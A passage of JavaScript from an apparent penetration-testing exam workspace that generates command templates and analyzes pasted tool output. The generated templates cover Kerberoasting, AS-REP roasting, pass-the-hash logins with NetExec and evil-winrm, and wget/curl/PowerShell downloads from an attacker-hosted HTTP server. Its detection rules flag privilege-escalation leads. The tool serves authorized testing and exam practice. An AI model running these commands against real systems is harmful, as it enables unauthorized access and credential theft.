  const dom=ident.domain||settings.DOMAIN||'',bind=/\\|@/.test(ident.raw)?ident.raw:(dom?ident.user+'@'+dom:ident.user);
  out.push(`ldapsearch -x -H ${uri} -D ${shQuote(bind)} -W -b ${shQuote(base)} '(objectClass=user)' sAMAccountName`);
  return out;
 }},
 kerberos:{title:'Kerberos',services:['KERBEROS'],make:(t,c,x)=>{
  const rawDc=String(settings.DC_IP||t?.ip||'').trim(),dc=rawDc?shQuote(rawDc):'$DC_IP';
  if(!c){const domain=settings.DOMAIN||'DOMAIN';return [`impacket-GetNPUsers ${shQuote(domain+'/')} -dc-ip ${dc} -usersfile users.txt -no-pass`]}
  const ident=credentialIdentity(c),domain=ident.domain||settings.DOMAIN||'DOMAIN',type=String(c.type||'password').toLowerCase(),user=ident.user,secret=getCredSecret(c);
  if(ident.scope==='local')return ['# Local SAM credential selected: Kerberos authenticates domain principals. Use a local-auth protocol path instead.'];
  if(ident.scope==='application')return ['# Application-scoped credential selected: do not reinterpret it as a Kerberos/domain password.'];
  if(type==='ntlm')return [`impacket-GetUserSPNs ${shQuote(domain+'/'+user)} -hashes :${shQuote(secret)} -dc-ip ${dc} -request`,`impacket-getTGT ${shQuote(domain+'/'+user)} -hashes :${shQuote(secret)} -dc-ip ${dc}`];
  if(type!=='password')return [`# ${type} material selected: use the Credential Material Router for the correct Kerberos proof path.`];
  return [`impacket-GetUserSPNs ${shQuote(domain+'/'+user)} -dc-ip ${dc} -request # password prompts interactively; avoids parser breakage on @/:`,`impacket-GetNPUsers ${shQuote(domain+'/')} -dc-ip ${dc} -usersfile users.txt -no-pass`];
 }},
 transfer:{title:'File transfer helpers',services:['FILE TRANSFER'],make:(t,c,x)=>{const lh=settings.LHOST?String(settings.LHOST):'$LHOST',base='http://'+lh+':8000/file';return[
  `python3 -m http.server 8000 --bind 0.0.0.0`,
  `wget ${shQuote(base)} -O /tmp/file`,
  `curl ${shQuote(base)} -o /tmp/file`,
  `powershell -c ${shQuote('iwr '+base+' -OutFile C:\\Windows\\Temp\\file')}`
 ]}}
};
function safeName(t){return (t.host||t.ip||'target').replace(/[^a-z0-9_-]+/gi,'_')}
function openPorts(t){return (t?.ports||[]).filter(p=>p.proto==='tcp'&&p.state!=='closed').map(p=>p.port).join(',')}
function servicePortNumbers(t,svc){return[...new Set((t?.ports||[]).filter(p=>p.proto==='tcp'&&p.state!=='closed'&&canonicalServiceName(p)===svc).map(p=>+p.port).filter(Boolean))].sort((a,b)=>a-b)}
function servicePortRecord(t,svc,preferred=[]){const rows=(t?.ports||[]).filter(p=>p.proto==='tcp'&&p.state!=='closed'&&canonicalServiceName(p)===svc);for(const port of preferred){const hit=rows.find(p=>+p.port===+port);if(hit)return hit}return rows[0]||null}
function serviceTLSHint(p){if(!p)return false;const text=`${p.service||''} ${p.product||''} ${p.version||''} ${p.extra||''}`.toLowerCase();return +p.port===5986||+p.port===443||+p.port===8443||/https|ssl|tls/.test(text)}
function ldapURIForTarget(t){const host=String(t?.ip||settings.DC_IP||'').trim();if(!host)return'$LDAP_URI';const p=servicePortRecord(t,'LDAP',[389,636,3268,3269]),port=+p?.port||389,tls=port===636||port===3269||serviceTLSHint(p),scheme=tls?'ldaps':'ldap',defaultPort=(scheme==='ldap'?389:636),suffix=port===defaultPort?'':`:${port}`;return shQuote(`${scheme}://${host}${suffix}`)}
function webSurfaceUrls(t,useIp=false){
 const host=String(useIp?(t?.ip||''):(t?.host||t?.ip||'')).trim()||'$TARGET',ports=(t?.ports||[]).filter(p=>p.proto==='tcp'&&p.state!=='closed'&&canonicalServiceName(p)==='WEB');
 if(!ports.length)return[`http://${host}/`];
 const seen=new Set(),out=[];for(const p of ports){const text=`${p.service||''} ${p.product||''} ${p.extra||''}`.toLowerCase(),port=+p.port,https=port===443||port===8443||/https|ssl/.test(text),scheme=https?'https':'http',suffix=(scheme==='http'&&port===80)||(scheme==='https'&&port===443)?'':`:${port}`,url=`${scheme}://${host}${suffix}/`;if(!seen.has(url)){seen.add(url);out.push(url)}}return out.slice(0,6)
}
function getCredSecret(c){return sessionCredentialSecrets[c.id]||c.secret||'PASSWORD'}
// Normalize the identity once. The credential UI accepts user, DOMAIN\\user or user@domain;
// command generation must not accidentally turn a qualified identity into domain/DOMAIN\\user.
function credentialIdentity(c){const raw=String(c?.user||'').trim();let user=raw||'USER',domain=String(settings.DOMAIN||'').trim();if(raw.includes('\\')){const i=raw.indexOf('\\'),d=raw.slice(0,i).trim(),u=raw.slice(i+1).trim();if(d)domain=d;if(u)user=u}else if(raw.includes('@')){const i=raw.lastIndexOf('@'),u=raw.slice(0,i).trim(),d=raw.slice(i+1).trim();if(u)user=u;if(d)domain=d}return{raw,user:user||'USER',domain,scope:String(c?.scope||'domain').toLowerCase()}}
// POSIX-shell quote dynamic values before placing them in copyable commands. This
// prevents spaces, $, !, quotes, semicolons and other credential characters from
// changing the command the user intended to run.
function shQuote(v){const s=String(v??'');return "'"+s.replaceAll("'","'\"'\"'")+"'"}
function cmdTarget(t,fallback='$TARGET'){const v=String(t?.ip||'').trim();return v?shQuote(v):fallback}
function cmdSMBTarget(t){const v=String(t?.ip||'').trim();return v?shQuote('//'+v):'//$TARGET'}
function credCommands(t,c,svc,lines){
 if(!c)return [`# Select a credential for ${svc}`];
 const ident=credentialIdentity(c),user=ident.user,domain=ident.domain||'DOMAIN',scope=ident.scope,secret=getCredSecret(c),type=String(c.type||'password').toLowerCase(),rawTarget=String(t?.ip||'').trim(),target=rawTarget?shQuote(rawTarget):'$TARGET';
 if(scope==='application')return [`# Application-scoped credential selected: do not fan it into ${svc} as an OS/domain password. Use it only with the application/protocol that issued it, unless you separately validate credential reuse.`];
 const u=shQuote(user),p=shQuote(secret),domainArg=(scope==='domain'&&ident.domain)?` -d ${shQuote(ident.domain)}`:'',localArg=scope==='local'?' --local-auth':'',nxcScope=localArg||domainArg;
 const smbUser=scope==='domain'&&ident.domain?ident.domain+'\\'+user:user,up=shQuote(smbUser+'%'+secret),mssql=rawTarget?shQuote((scope==='domain'&&ident.domain?ident.domain+'/':'')+user+':'+secret+'@'+rawTarget):'$MSSQL_TARGET',sshTarget=rawTarget?shQuote(user+'@'+rawTarget):'$SSH_TARGET',sshPort=servicePortNumbers(t,'SSH')[0]||22,sshPortArg=sshPort!==22?` -p ${sshPort}`:'',smbTarget=rawTarget?shQuote('//'+rawTarget):'//$TARGET';
 const winrmRec=servicePortRecord(t,'WINRM',[5985,5986]),winrmPort=+winrmRec?.port||5985,winrmTLS=serviceTLSHint(winrmRec),winrmCustom=!!winrmRec&&(!(servicePortNumbers(t,'WINRM').includes(5985)&&servicePortNumbers(t,'WINRM').includes(5986))),winrmNxc=winrmCustom?` --port ${winrmPort} --check-proto ${winrmTLS?'https':'http'}`:'',winrmEvil=`${winrmTLS?' -S':''}${winrmPort!==5985?` -P ${winrmPort}`:''}`;
 const rdpPort=servicePortNumbers(t,'RDP')[0]||3389,rdpNxc=rdpPort!==3389?` --port ${rdpPort}`:'';
 const mssqlPort=servicePortNumbers(t,'MSSQL')[0]||1433,mssqlNxc=mssqlPort!==1433?` --port ${mssqlPort}`:'',mssqlImp=mssqlPort!==1433?` -port ${mssqlPort}`:'';
 // Route NT hashes to pass-the-hash flags instead of silently treating them as passwords.
 // Unsupported material types are stopped here so the builder cannot emit a plausible-but-wrong command.
 if(type==='ntlm'){
  const h=shQuote(secret),impacketTarget=rawTarget?shQuote((scope==='domain'&&ident.domain?ident.domain+'/':'')+user+'@'+rawTarget):'$IMPACKET_TARGET';
  if(svc==='SMB')return [`nxc smb ${target} -u ${u} -H ${h}${nxcScope}`,`nxc smb ${target} -u ${u} -H ${h} --shares${nxcScope}`,`smbclient -L ${smbTarget} -U ${shQuote(smbUser+'%'+secret)} --pw-nt-hash`];
  if(svc==='WINRM')return [`nxc winrm ${target}${winrmNxc} -u ${u} -H ${h}${nxcScope}`,`evil-winrm -i ${target} -u ${u} -H ${h}${winrmEvil}`];
  if(svc==='RDP')return [`nxc rdp ${target}${rdpNxc} -u ${u} -H ${h}${nxcScope}`];
  if(svc==='MSSQL'){const out=[`nxc mssql ${target}${mssqlNxc} -u ${u} -H ${h}${nxcScope}`];if(scope==='domain')out.push(`impacket-mssqlclient${mssqlImp} ${impacketTarget} -hashes :${h} -windows-auth`);else out.push('# Local MSSQL Windows auth: validate with NetExec --local-auth above; qualify HOSTNAME/user explicitly before using another client.');return out}
  if(svc==='LDAP')return [scope==='local'?'# Local SAM credential selected: LDAP/Kerberos are domain services. Validate this credential on local protocols instead.':'# NTLM hash selected: simple ldapsearch -w cannot use pass-the-hash. Use a hash-capable AD client for the exact LDAP task, or obtain a Kerberos ticket first.'];
  return [`# ${svc}: NTLM hash selected. Confirm this client/protocol supports pass-the-hash before use.`];
 }
 // Never reinterpret bearer tokens, tickets, certificates or keys as passwords.
 // A plausible-looking command with the wrong credential material wastes more exam time than no command.
 if(type==='ssh key'){
  if(svc==='SSH')return [`# SSH key selected: use the Credential Material Router and the actual key FILE path, e.g. ssh -i /path/to/key${sshPortArg} ${sshTarget}. The saved secret/note is never inserted as a path.`];
  return [`# SSH key selected: ${svc} does not consume an SSH private key. Use the Credential Material Router.`];
 }
 if(type==='ccache')return [`# ccache selected: export KRB5CCNAME to the actual ticket-cache FILE and use a Kerberos-capable client (-k / -no-pass as appropriate). Use the Credential Material Router.`];
 if(type==='certificate')return [`# certificate selected: use the Credential Material Router for certificate authentication / ticket acquisition; do not pass certificate material to a password flag.`];
 if(type==='token')return [`# token selected: bearer/application tokens are not generic OS passwords. Use the token only with the application/protocol that issued it; see the Credential Material Router.`];
 if(type!=='password')return [`# ${type} material selected: this ${svc} template expects password or supported NTLM material. Use the Credential Material Router.`];
 if(scope==='local'&&(svc==='LDAP'||svc==='KERBEROS'))return [`# Local SAM credential selected: ${svc} is a domain-authentication path. Use SMB/WinRM/RDP/MSSQL/SSH as appropriate, or change scope only after proving the identity is also a domain account.`];
 if(svc==='WINRM')return [`nxc winrm ${target}${winrmNxc} -u ${u} -p ${p}${nxcScope}`,`evil-winrm -i ${target} -u ${u} -p ${p}${winrmEvil}`];
 if(svc==='RDP')return [`nxc rdp ${target}${rdpNxc} -u ${u} -p ${p}${nxcScope}`];
 if(svc==='MSSQL'){const out=[`nxc mssql ${target}${mssqlNxc} -u ${u} -p ${p}${nxcScope}`];if(scope==='domain'&&rawTarget)out.push(`impacket-mssqlclient${mssqlImp} ${shQuote((ident.domain?ident.domain+'/':'')+user+'@'+rawTarget)} -windows-auth # password prompts interactively`);else if(scope==='local')out.push('# Local MSSQL Windows auth: validate with NetExec --local-auth above; qualify HOSTNAME/user explicitly before another client.');else out.push('# Set a concrete MSSQL target before using the Impacket client.');return out}
 return lines.map(x=>x.replaceAll('{MSSQL_TARGET}',mssql).replaceAll('{SSH_PORT}',sshPort!==22?`-p ${sshPort} `:'').replaceAll('{SSH_TARGET}',sshTarget).replaceAll('{SMB_TARGET}',smbTarget).replaceAll('{TARGET}',target).replaceAll('{UP}',up).replaceAll('{U}',u).replaceAll('{P}',p)).map(x=>/^nxc\s/i.test(x)?x+nxcScope:x);
}
function domainDN(d){return d?d.split('.').filter(Boolean).map(x=>'DC='+x).join(','):'DC=domain,DC=local'}
function normalizeBaseDN(v){const s=String(v||'').trim();if(!s)return domainDN(settings.DOMAIN);return /(?:^|,)\s*(?:DC|OU|CN)=/i.test(s)?s:domainDN(s.replace(/^@/,''))}
function renderCommandSelectors(){
 const t=$('#cmdTarget'),c=$('#cmdCredential'),s=$('#cmdService');if(!t||!c||!s)return;
 t.innerHTML=targets.map(x=>`<option value="${esc(x.id)}">${esc(targetLabel(x))}</option>`).join('')||'<option value="">No targets</option>';t.value=activeTargetId||targets[0]?.id||'';
 c.innerHTML='<option value="">No credential</option>'+credentials.map(x=>`<option value="${esc(x.id)}">${esc(x.user)} · ${esc(x.type)}</option>`).join('');
 const detected=new Set((activeTarget()?.ports||[]).filter(p=>p.state!=='closed').map(p=>canonicalServiceName(p)).filter(Boolean));
 s.innerHTML=V8_CMD_SERVICES.map(x=>`<option>${detected.has(x)||[...detected].some(d=>d.includes(x))?'★ ':''}${x}</option>`).join('');
 [...s.options].forEach(o=>o.value=o.text.replace(/^★\s*/,''));
 renderCommandTemplates();
}
function openCommandBuilderFor(targetId,credentialId='',service='TRIAGE'){
 if(targetId&&targets.some(t=>t.id===targetId))setActiveTarget(targetId);
 switchView('commandsView');renderCommandSelectors();
 const ts=$('#cmdTarget'),cs=$('#cmdCredential'),ss=$('#cmdService');
 if(ts&&targetId&&[...ts.options].some(o=>o.value===targetId))ts.value=targetId;
 if(cs&&credentialId&&[...cs.options].some(o=>o.value===credentialId))cs.value=credentialId;
 if(ss&&service&&[...ss.options].some(o=>o.value===service))ss.value=service;
 selectedCmdTemplate='';renderCommandTemplates();
}
function templateMatches(k,svc){return V8_CMD_TEMPLATES[k].services.includes(svc)}
function renderCommandTemplates(){
 const svc=$('#cmdService')?.value||'TRIAGE';const keys=Object.keys(V8_CMD_TEMPLATES).filter(k=>templateMatches(k,svc)||svc==='TRIAGE'&&k==='triage');
 if(!keys.includes(selectedCmdTemplate))selectedCmdTemplate=keys[0]||'triage';
 $('#commandTemplates').innerHTML=keys.map(k=>`<div class="cmdItem ${k===selectedCmdTemplate?'active':''}" data-ct="${k}"><b>${esc(V8_CMD_TEMPLATES[k].title)}</b></div>`).join('');
 $$('#commandTemplates [data-ct]').forEach(x=>x.onclick=()=>{selectedCmdTemplate=x.dataset.ct;renderBuiltCommands();renderCommandTemplates()});renderBuiltCommands();
}
function renderBuiltCommands(){
 const t=targets.find(x=>x.id===$('#cmdTarget')?.value)||activeTarget(),c=credentials.find(x=>x.id===$('#cmdCredential')?.value)||null,extra=$('#cmdExtra')?.value.trim()||'';
 const tpl=V8_CMD_TEMPLATES[selectedCmdTemplate]||V8_CMD_TEMPLATES.triage,lines=tpl.make(t||upgradeV8Target(newTarget()),c,extra);
 $('#cmdTitle').textContent=tpl.title;$('#builtCommands').textContent=lines.join('\n');$('#cmdCaution').textContent='Generated commands are templates. Confirm scope, exact prerequisites, installed-tool syntax, and current OffSec rules before use.';
}
['cmdTarget','cmdCredential','cmdService'].forEach(id=>$('#'+id).onchange=()=>{if(id==='cmdTarget')setActiveTarget($('#'+id).value);renderCommandTemplates()});
$('#cmdExtra').oninput=renderBuiltCommands;
async function copyBuiltCommandsSafely(){
 const text=$('#builtCommands').textContent||'';
 const result=lintCommand(text);
 const blockers=result.issues.filter(i=>i.sev==='block');
 if(blockers.length){
  const names=blockers.map(i=>i.title).join(' · ');
  const inline=$('#cmdGuardInline');if(inline)inline.innerHTML=guardIssuesHTML(result);
  toast(`Copy blocked — fix ${blockers.length} guard issue${blockers.length===1?'':'s'} first: ${names}`);
  return;
 }
 const warnings=result.issues.filter(i=>i.sev==='warn');
 if(warnings.length){
  const ok=confirm('Guard warning(s):\n\n'+warnings.map(i=>'• '+i.title+': '+i.why).join('\n')+'\n\nCopy these commands anyway?');
  if(!ok){toast('Copy cancelled — review guard warnings');return;}
 }
 toast(await copyText(text)?'Guard checked — commands copied':'Copy blocked by browser');
}
$('#copyBuiltCommands').onclick=copyBuiltCommandsSafely;

/* Cockpit/workspace timeline integration. */
function renderCockpitResume(){const r=$('#cockpitResume'),t=activeTarget();if(r)r.innerHTML=resumeHTML(t)}
const v8ActiveSummary=renderActiveSummary;renderActiveSummary=function(){v8ActiveSummary();renderCockpitResume();renderCockpitScore()};

/* Patch status changes into timeline. */
['wsRole','wsStage','wsConfidence'].forEach(id=>{
 const el=$('#'+id),old=el.onchange;
 el.onchange=()=>{const t=activeTarget(),before=t?{role:t.role,stage:t.stage,confidence:t.confidence}:null;old&&old();const after=activeTarget();if(after&&before){const val=id==='wsRole'?after.role:id==='wsStage'?after.stage:after.confidence;const prev=id==='wsRole'?before.role:id==='wsStage'?before.stage:before.confidence;if(val!==prev){logEvent(after,'state',`${id.replace('ws','')}: ${prev} → ${val}`);saveTargets();renderTimeline(after)}}};
});

/* Exam board shortcut */
function renderAllV8(){renderAllV7();renderScanPreview();renderBoard();renderCommandSelectors();renderCockpitResume()}
const v8Switch=switchView;
switchView=function(id){v8Switch(id);if(id==='intakeView')renderScanPreview();if(id==='boardView')renderBoard();if(id==='commandsView')renderCommandSelectors()};



renderAllV8();

/* ===== V9 Output Analyzer / Evidence Vault / Encrypted Recovery ===== */
let evidenceVault=safeStoredArray(STORE+'evidenceVault');
let analyzerDetections=[];
let autosnapshots=safeStoredArray(STORE+'autosnapshots');
let v9Dirty=false;
let lastSnapshotAt=+(localStorage.getItem(STORE+'lastSnapshotAt')||0);

const OUTPUT_RULES=[
 {id:'seimp',level:'high',title:'SeImpersonatePrivilege is enabled',tag:'[WIN:SEIMPERSONATE]',signal:'seimp',confidence:'high',re:/SeImpersonatePrivilege[^\r\n]*Enabled/i,why:'Strong Windows token-impersonation lead. Validate exact build, service context and compatible primitive before choosing a technique.'},
 {id:'seassign',level:'high',title:'SeAssignPrimaryTokenPrivilege is enabled',tag:'[WIN:SEIMPERSONATE]',signal:'seimp',confidence:'high',re:/SeAssignPrimaryTokenPrivilege[^\r\n]*Enabled/i,why:'Token-creation/assignment privilege is present; validate the exact compatible path.'},
 {id:'sebackup',level:'high',title:'SeBackupPrivilege is enabled',tag:'[WIN:BACKUP]',signal:null,confidence:'high',re:/SeBackupPrivilege[^\r\n]*Enabled/i,why:'Protected-file read may be possible. Presence is not the same as SYSTEM; validate the file-read path.'},
 {id:'serestore',level:'warn',title:'SeRestorePrivilege is enabled',tag:'[WIN:PRIV]',signal:null,confidence:'prereq',re:/SeRestorePrivilege[^\r\n]*Enabled/i,why:'A sensitive Windows privilege is enabled. Validate exact write/restore semantics before pursuing.'},
 {id:'sedebug',level:'warn',title:'SeDebugPrivilege is enabled',tag:'[WIN:PRIV]',signal:null,confidence:'prereq',re:/SeDebugPrivilege[^\r\n]*Enabled/i,why:'Debug access can be powerful but context and accessible privileged processes still matter.'},
 {id:'system',level:'high',title:'SYSTEM shell explicitly confirmed',tag:'[EVIDENCE:PACKET]',signal:null,confidence:'exploited',re:/NT AUTHORITY\\SYSTEM/i,why:'The pasted output explicitly contains NT AUTHORITY\\SYSTEM. Transition to proof/evidence rather than continuing random privesc.' ,status:'privesc'},
 {id:'root',level:'high',title:'root identity explicitly confirmed',tag:'[EVIDENCE:PACKET]',signal:null,confidence:'exploited',re:/uid=0\(root\)/i,why:'The pasted id output confirms effective root identity. Transition to proof/evidence.',status:'privesc'},
 {id:'sudo-nopass',level:'high',title:'sudo NOPASSWD entry detected',tag:'[LINUX:SUDO]',signal:'sudo',confidence:'high',re:/NOPASSWD\s*:/i,why:'A sudo rule may provide a direct high-signal path. Validate exact binary, allowed args, environment and controllable dependencies.'},
 {id:'sudo-setenv',level:'warn',title:'sudo SETENV detected',tag:'[LINUX:SUDO]',signal:'sudo',confidence:'prereq',re:/\bSETENV\b/i,why:'Environment preservation/control may matter for an allowed sudo command. Validate what variables actually reach privileged execution.'},
 {id:'cap-setuid',level:'high',title:'cap_setuid capability detected',tag:'[LINUX:CAPABILITIES]',signal:null,confidence:'high',re:/cap_setuid/i,why:'A file capability may permit UID manipulation depending on the exact binary and effective/permitted capability flags.'},
 {id:'cap-dac',level:'warn',title:'DAC-bypass capability detected',tag:'[LINUX:CAPABILITIES]',signal:null,confidence:'prereq',re:/cap_dac_(?:read_search|override)/i,why:'Potential protected-file access. Validate exact binary semantics before treating it as privesc.'},
 {id:'docker-group',level:'warn',title:'docker group membership detected',tag:'[LINUX:CONTAINER]',signal:'container',confidence:'prereq',re:/(?:groups=.*\bdocker\b|\bdocker\b.*\bgroup\b|\bGroups\b[^\r\n]*\bdocker\b)/i,why:'Container tooling alone is not enough; validate socket access, host mounts or other host-resource control.'},
 {id:'lxd-group',level:'warn',title:'lxd/lxc group membership detected',tag:'[LINUX:CONTAINER]',signal:'container',confidence:'prereq',re:/(?:groups=.*\b(?:lxd|lxc)\b|\bGroups\b[^\r\n]*\b(?:lxd|lxc)\b)/i,why:'Validate actual container management permissions and host-resource exposure.'},
 {id:'pwned',level:'high',title:'Administrative-capable NetExec result detected',tag:'[AD:LATERAL]',signal:'creds',confidence:'high',re:/Pwn3d!/i,why:'The output reports administrative-capable access. Record the credential context and validate the intended remote-execution/lateral path.'},
 {id:'nxc-valid',level:'warn',title:'Successful authentication-like NetExec output detected',tag:'[CREDS:FANOUT]',signal:'creds',confidence:'prereq',re:/\[\+\][^\r\n]*(?:SMB|WINRM|RDP|MSSQL|LDAP)[^\r\n]*(?::|\s)(?!.*Pwn3d)/i,why:'Authentication appears successful. Authorization/admin capability must be assessed separately.'},
 {id:'krb-skew',level:'err',title:'Kerberos clock-skew error detected',tag:'[ERROR:KRB_SKEW]',signal:null,confidence:'unconfirmed',re:/KRB_AP_ERR_SKEW|clock skew/i,why:'Fix DC/DNS/time alignment before debugging the attack technique itself.'},
 {id:'kdc-preauth',level:'err',title:'Kerberos pre-authentication failure detected',tag:'[AD:KERBEROS]',signal:null,confidence:'unconfirmed',re:/KDC_ERR_PREAUTH_FAILED/i,why:'Check exact principal/domain and authentication material before changing attack paths.'},
 {id:'no-kdc',level:'err',title:'Cannot contact KDC detected',tag:'[AD:KERBEROS]',signal:null,confidence:'unconfirmed',re:/Cannot contact any KDC|cannot find KDC/i,why:'Validate DNS, DC hostname, routing and port 88 first.'},
 {id:'krb-preauth-required',level:'warn',title:'Kerberos PREAUTH_REQUIRED detected — identity signal, not roastability',tag:'[AD:KERBEROS]',signal:null,confidence:'unconfirmed',re:/KDC_ERR_PREAUTH_REQUIRED/i,why:'The KDC is requesting normal pre-authentication and commonly confirms the principal exists. Do not label this AS-REP roastable unless hash material is actually returned.'},
 {id:'krb-spn-unknown',level:'warn',title:'Kerberos service principal / target name error detected',tag:'[AD:KERBEROS]',signal:null,confidence:'unconfirmed',re:/KDC_ERR_S_PRINCIPAL_UNKNOWN|server not found in kerberos database/i,why:'Verify the service SPN, FQDN, DNS mapping and actual target host before changing a known credential.'},
 {id:'krb-modified',level:'warn',title:'Kerberos ticket/service identity mismatch detected',tag:'[AD:KERBEROS]',signal:null,confidence:'unconfirmed',re:/KRB_AP_ERR_MODIFIED|message stream modified/i,why:'Check target FQDN/SPN, DNS, stale ticket context and duplicate service identity before changing the credential.'},
 {id:'rubeus-asrep-material',level:'high',title:'AS-REP roast hash material returned',tag:'[AD:KERBEROS]',signal:null,confidence:'high',re:/\$krb5asrep\$(?:17|18|23)\$/i,why:'Actual AS-REP hash material is present. Save it exactly, crack offline only if justified, and do not confuse this with PREAUTH_REQUIRED.'},
 {id:'rubeus-tgs-material',level:'high',title:'Kerberoast TGS hash material returned',tag:'[AD:KERBEROS]',signal:null,confidence:'high',re:/\$krb5tgs\$(?:17|18|23)\$/i,why:'Actual service-ticket hash material is present. Record the service account/SPN and crack offline only if worthwhile.'},
 {id:'rubeus-ptt-success',level:'high',title:'Rubeus ticket import success detected',tag:'[AD:KERBEROS]',signal:null,confidence:'high',re:/Ticket successfully imported|successfully imported (?:the )?ticket/i,why:'The ticket was imported into a Windows logon session. Verify with klist, then test only the exact service/FQDN the ticket should authorize.'},
 {id:'smb-logon',level:'err',title:'SMB logon failure detected',tag:'[ERROR:SMB]',signal:null,confidence:'unconfirmed',re:/STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE/i,why:'Re-check account/domain/secret format. This is an authentication failure, not proof the service is irrelevant.'},
 {id:'smb-denied',level:'warn',title:'SMB access denied detected',tag:'[ERROR:SMB]',signal:null,confidence:'unconfirmed',re:/STATUS_ACCESS_DENIED|NT_STATUS_ACCESS_DENIED/i,why:'Authentication may have worked while authorization failed. Separate the two questions.'},
 {id:'http403',level:'warn',title:'HTTP 403 detected',tag:'[ERROR:403]',signal:'web',confidence:'unconfirmed',re:/HTTP\/(?:1\.[01]|2)\s+403|403 Forbidden/i,why:'The resource may exist. Validate vhost, auth context, method, path normalization and backend differences rather than assuming dead content.'},
 {id:'alwaysinstall',level:'high',title:'AlwaysInstallElevated indicators detected',tag:'[WIN:REGISTRY]',signal:null,confidence:'prereq',test:t=>(t.match(/AlwaysInstallElevated/gi)||[]).length>=2&&((t.match(/0x1/gi)||[]).length>=2),why:'Both policy locations appear in the pasted output. Verify both are actually set to 1 on the current target before treating it as a path.'},
 {id:'nmap',level:'warn',title:'Nmap output detected — use Scan Intake',tag:'[SERVICE:UNKNOWN]',signal:null,confidence:'unconfirmed',re:/Nmap scan report for|<nmaprun\b|Ports:\s+\d+\/open\//i,why:'The app can parse Nmap structurally in Scan Intake. Import it there rather than converting it into a generic finding.',skipApply:true}
];

function excerptFor(text,rule){
 const re=rule.re;if(!re)return text.slice(0,180);
 const m=text.match(re);if(!m)return text.slice(0,180);
 const i=Math.max(0,(m.index||0)-90),j=Math.min(text.length,(m.index||0)+m[0].length+120);
 return text.slice(i,j).replace(/\r/g,'').trim();
}
function analyzeText(text){
 const found=[];
 for(const r of OUTPUT_RULES){
  const hit=r.test?r.test(text):(r.re&&r.re.test(text));
  if(hit)found.push({...r,excerpt:excerptFor(text,r),selected:!r.skipApply});
 }
 return found;
}
function renderAnalyzer(){
 const root=$('#analyzerResults'),stats=$('#analyzerStats');if(!root)return;
 stats.textContent=analyzerDetections.length?`${analyzerDetections.length} deterministic pattern(s) detected`:'No detections.';
 $('#applyAllDetections').disabled=!analyzerDetections.some(x=>x.selected&&!x.skipApply);
 root.innerHTML=analyzerDetections.length?analyzerDetections.map((d,i)=>`<div class="detectCard ${d.level}"><div class="row" style="justify-content:space-between"><div><label><input class="detectSelect" data-di="${i}" type="checkbox" ${d.selected&&!d.skipApply?'checked':''} ${d.skipApply?'disabled':''}> <span class="detectTitle">${esc(d.title)}</span></label><div class="chips" style="margin-top:5px"><span class="chip">${esc(d.tag)}</span>${d.signal?`<span class="chip">signal:${esc(d.signal)}</span>`:''}<span class="chip">${esc(confLabel(d.confidence))}</span></div></div><button class="btn analyzerOpenTag" data-tag="${esc(d.tag)}">Open tag</button></div><div class="detectReason">${esc(d.why)}</div><div class="detectExcerpt">${esc(d.excerpt)}</div></div>`).join(''):'<div class="muted">No known high-signal pattern detected. That does not mean the output is unimportant; use the full reference/search manually.</div>';
 $$('.detectSelect').forEach(x=>x.onchange=()=>{analyzerDetections[+x.dataset.di].selected=x.checked;renderAnalyzer()});
 $$('.analyzerOpenTag').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.tag;switchView('searchView');renderSearch(b.dataset.tag)});
}
function renderAnalyzerTarget(){
 const s=$('#analyzerTarget');if(!s)return;s.innerHTML=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('')||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||'';
}
$('#analyzeOutput').onclick=()=>{analyzerDetections=analyzeText($('#analyzerInput').value);renderAnalyzer()};
$('#clearAnalyzer').onclick=()=>{$('#analyzerInput').value='';analyzerDetections=[];renderAnalyzer()};
$('#analyzerTarget').onchange=e=>setActiveTarget(e.target.value);
$('#applyAllDetections').onclick=()=>{
 const t=targets.find(x=>x.id===$('#analyzerTarget').value)||activeTarget();if(!t){alert('Add/select a target first.');return}
 const selected=analyzerDetections.filter(d=>d.selected&&!d.skipApply);let added=0;
 selected.forEach(d=>{
   if(d.signal&&!hasSignal(t,d.signal))t.signals.push(d.signal);
   if(d.status==='privesc'){t.status.privesc=true;t.stage='evidence';t.confidence='exploited'}
   if(!t.findings.some(f=>f.title===d.title)){t.findings.push({title:d.title,tag:d.tag,confidence:d.confidence,created:Date.now(),source:'output-analyzer'});added++}
 });
 if(selected.length){logEvent(t,'analysis',`Output Analyzer applied ${selected.length} detection(s): ${selected.map(x=>x.title).join('; ')}`);saveTargets();renderWorkspace();renderAnalyzer();toast(`Applied ${selected.length} detection(s), ${added} new finding(s)`)};
};

/* Evidence Vault: metadata + hash only */
function saveVault(){safeStoreSet(STORE+'evidenceVault',JSON.stringify(evidenceVault));v9Dirty=true;renderVault();renderReportEvidenceManifest();renderSessionHealth()}
function bytes(n){if(n<1024)return n+' B';if(n<1048576)return(n/1024).toFixed(1)+' KB';return(n/1048576).toFixed(1)+' MB'}
function hex(buf){return[...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('')}
async function hashFile(file){return hex(await crypto.subtle.digest('SHA-256',await file.arrayBuffer()))}
async function addVaultFiles(files){
 const targetId=$('#vaultTarget').value||activeTargetId,kind=$('#vaultKind').value,note=$('#vaultNote').value.trim();
 for(const file of files){
  try{
   const sha=await hashFile(file);
   const existing=evidenceVault.find(x=>x.sha256===sha&&x.targetId===targetId);
   if(existing){toast(`Already registered: ${file.name}`);continue}
   evidenceVault.push({id:crypto.randomUUID?crypto.randomUUID():Date.now()+'-'+Math.random(),targetId,kind,note,name:file.name,size:file.size,type:file.type||'',lastModified:file.lastModified||0,sha256:sha,addedAt:Date.now(),ipVisible:false,proofVisible:false,originalLocation:false});
   const t=targets.find(x=>x.id===targetId);if(t)logEvent(t,'evidence',`Evidence registered: ${file.name} (${kind})`);
  }catch(e){toast(`Hash failed: ${file.name}`)}
 }
 saveTargets();saveVault();
}
function renderVaultSelectors(){
 const opts=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');['vaultTarget'].forEach(id=>{const s=$('#'+id);if(s){s.innerHTML=opts||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||''}});
}
function renderVault(){
 const body=$('#vaultBody'),stats=$('#vaultStats');if(!body||!stats)return;
 const targetId=$('#vaultTarget')?.value||activeTargetId;const items=evidenceVault.filter(x=>!targetId||x.targetId===targetId);
